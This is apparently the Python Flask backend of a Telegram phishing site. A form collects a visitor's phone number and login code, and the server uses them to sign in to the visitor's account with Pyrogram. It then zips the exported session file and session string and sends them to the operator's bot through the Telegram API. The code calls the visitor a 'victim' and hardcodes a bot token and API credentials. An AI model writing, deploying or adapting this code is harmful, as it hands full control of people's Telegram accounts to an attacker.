from flask import Flask, request, jsonify, send_from_directory
import os
import asyncio
import re
import requests
import zipfile
from threading import Thread

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИ) =====
BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 742347183
API_ID = 39945573
API_HASH = "4addef563b163d9d1977fdfb4abf50db"

PROXY_ENABLED = False
proxy_dict = None

# Хранилище: phone -> {'client': client, 'hash': hash}
temp_sessions = {}

def send_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": text[:4000]})
    except:
        pass

def send_file(file_path, caption):
    try:
        with open(file_path, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": OWNER_ID, "caption": caption},
                          files={"document": f})
    except:
        pass

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    from pyrogram import Client
    
    phone = request.json.get('phone', '')
    phone_clean = re.sub(r'\D', '', phone)
    if not phone_clean.startswith('7'):
        phone_clean = '7' + phone_clean
    phone_full = '+' + phone_clean
    
    send_telegram(f"📱 Отправляю код на {phone_full}...")
    
    async def send_code_async():
        try:
            client = Client(f"temp_{phone_clean}", api_id=API_ID, api_hash=API_HASH, proxy=proxy_dict)
            await client.connect()
            result = await client.send_code(phone_full)
            temp_sessions[phone_full] = {
                'client': client,
                'phone_code_hash': result.phone_code_hash
            }
            send_telegram(f"✅ Код отправлен на {phone_full}")
            return True
        except Exception as e:
            send_telegram(f"❌ Ошибка отправки кода на {phone_full}: {str(e)[:200]}")
            return False
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success = loop.run_until_complete(send_code_async())
    
    if success:
        return jsonify({"status": "ok", "message": "Код отправлен"})
    else:
        return jsonify({"status": "error", "message": "Не удалось отправить код"}), 500

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    from pyrogram import Client
    import zipfile
    
    phone = request.json.get('phone', '')
    code = request.json.get('code', '')
    
    phone_clean = re.sub(r'\D', '', phone)
    if not phone_clean.startswith('7'):
        phone_clean = '7' + phone_clean
    phone_full = '+' + phone_clean
    
    send_telegram(f"🔑 Пытаюсь войти в {phone_full} с кодом {code}")
    
    if phone_full not in temp_sessions:
        send_telegram(f"❌ Нет активной сессии для {phone_full}. Жертва должна начать заново.")
        return jsonify({"success": False, "error": "Сессия истекла, начните заново"})
    
    session_data = temp_sessions[phone_full]
    client = session_data['client']
    phone_code_hash = session_data['phone_code_hash']
    
    async def login_async():
        try:
            await client.sign_in(phone_full, code, phone_code_hash=phone_code_hash)
            
            session_string = await client.export_session_string()
            session_file = f"session_{phone_clean}.session"
            client.session.set_db(session_file)
            await client.disconnect()
            
            zip_name = f"{phone_clean}.zip"
            with zipfile.ZipFile(zip_name, 'w') as zf:
                zf.write(session_file, arcname=f"{phone_clean}.session")
            
            send_file(zip_name, f"✅ Аккаунт: {phone_full}\n\n{session_string}")
            
            os.remove(session_file)
            os.remove(zip_name)
            
            del temp_sessions[phone_full]
            return True
        except Exception as e:
            send_telegram(f"❌ Ошибка входа: {str(e)[:200]}")
            return False
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success = loop.run_until_complete(login_async())
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Ошибка входа"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
